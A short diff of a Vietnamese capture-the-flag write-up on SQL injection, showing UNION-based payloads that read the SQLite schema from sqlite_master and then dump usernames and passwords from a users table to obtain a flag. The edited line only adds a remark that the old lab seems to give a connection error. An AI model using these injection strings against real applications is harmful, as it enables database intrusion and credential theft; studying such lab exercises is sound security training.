@@ -19,5 +19,5 @@ Sử dụng ```a’union select 1,sql FROM sqlite_master;``` => thấy tên bả
 
 Sau đó chỉ cần ```a’ union select username,password FROM users--``` => flag là ```c4K04dtIaJsuWdi```
 
-:V đến đây rồi thì dễ thôi nhưng có vẻ như lab quá lâu rồi và có vấn đề nào đó khi truy vấn tới database nên nó sẽ báo lỗi thì phải 
+:V đến đây rồi thì dễ thôi nhưng có vẻ như lab quá lâu rồi và có vấn đề nào đó khi truy vấn tới database nên nó sẽ báo lỗi connect thì phải =))) tôi đoán vậy
 
